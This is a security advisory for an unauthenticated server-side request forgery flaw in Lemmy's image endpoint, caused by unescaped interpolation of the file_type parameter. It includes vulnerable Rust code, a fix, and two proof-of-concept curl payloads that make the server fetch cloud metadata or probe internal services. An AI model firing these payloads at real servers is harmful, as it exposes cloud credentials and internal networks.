# [H] Lemmy has unauthenticated SSRF via file_type query parameter injection in image endpoint

## Summary
Severity: High
Advisory: GHSA-jvxv-2jjp-jxc3
CVE: CVE-2026-29178
CWE: CWE-918
Ecosystem: crates.io
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:P (CVSS_V4)
Published: 2026-03-04
Source: https://github.com/advisories/GHSA-jvxv-2jjp-jxc3
Type: github-advisory

## Affected
- crates.io: `lemmy_routes` — affected >=0 <0.19.16

## Details
## Summary

The `GET /api/v4/image/{filename}` endpoint is vulnerable to unauthenticated SSRF through parameter injection in the `file_type` query parameter. An attacker can inject arbitrary query parameters into the internal request to pict-rs, including the `proxy` parameter which causes pict-rs to fetch arbitrary URLs.

## Affected code

`crates/routes/src/images/download.rs`, lines 17-40 (`get_image` function):

```rust
pub async fn get_image(
  filename: Path<String>,
  Query(params): Query<ImageGetParams>,
  req: HttpRequest,
  context: Data<LemmyContext>,
) -> LemmyResult<HttpResponse> {
  let name = &filename.into_inner();
  let pictrs_url = context.settings().pictrs()?.url;
  let processed_url = if params.file_type.is_none() && params.max_size.is_none() {
    format!("{}image/original/{}", pictrs_url, name)
  } else {
    let file_type = file_type(params.file_type, name);
    let mut url = format!("{}image/process.{}?src={}", pictrs_url, file_type, name);
    // ...
  };
  do_get_image(processed_url, req, &context).await
}
```

The `file_type` parameter (`ImageGetParams.file_type: Option<String>`) is directly interpolated into the URL string without any validation or encoding. Since pict-rs's `/image/process.{ext}` endpoint supports a `?proxy={url}` parameter for fetching remote images, an attacker can inject `?proxy=...` via `file_type` to make pict-rs fetch arbitrary URLs.

This endpoint does not require authentication (no `LocalUserView` extractor).

## PoC

```bash
# Basic SSRF - make pict-rs fetch AWS metadata endpoint
# The file_type value is: jpg?proxy=http://169.254.169.254/latest/meta-data&x=
# This constructs: http://pictrs:8080/image/process.jpg?proxy=http://169.254.169.254/latest/meta-data&x=?src=anything

curl -v 'https://TARGET/api/v4/image/anything?file_type=jpg%3Fproxy%3Dhttp%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%26x%3D'

# Scan internal services on the Docker network
curl -v 'https://TARGET/api/v4/image/anything?file_type=jpg%3Fproxy%3Dhttp%3A%2F%2Flemmy%3A8536%2Fapi%2Fv4%2Fsite%26x%3D'

# The same issue exists in the image_proxy endpoint, but it requires the
# proxy URL to exist in the remote_image table (RemoteImage::validate check),
# making it harder to exploit.
```

The response from the internal URL is streamed back to the attacker through pict-rs and Lemmy.

## Impact

An unauthenticated attacker can:
- Access cloud metadata services (AWS/GCP/Azure instance metadata) from the pict-rs service
- Scan and interact with internal services on the Docker network (pict-rs is typically co-located with Lemmy, PostgreSQL, etc.)
- Bypass the `RemoteImage::validate()` check that protects the `image_proxy` endpoint

## Suggested Fix

Validate the `file_type` parameter to only allow alphanumeric characters:

```rust
fn file_type(file_type: Option<String>, name: &str) -> String {
  let ft = file_type
    .unwrap_or_else(|| name.split('.').next_back().unwrap_or("jpg").to_string());
  if ft.chars().all(|c| c.is_alphanumeric()) {
    ft
  } else {
    "jpg".to_string()
  }
}
```

## References
- https://github.com/LemmyNet/lemmy/security/advisories/GHSA-jvxv-2jjp-jxc3
- https://nvd.nist.gov/vuln/detail/CVE-2026-29178
- https://github.com/LemmyNet/lemmy/commit/f47a03f56d1797bceab5f34b6f624c91cecd5871
- https://github.com/LemmyNet/lemmy
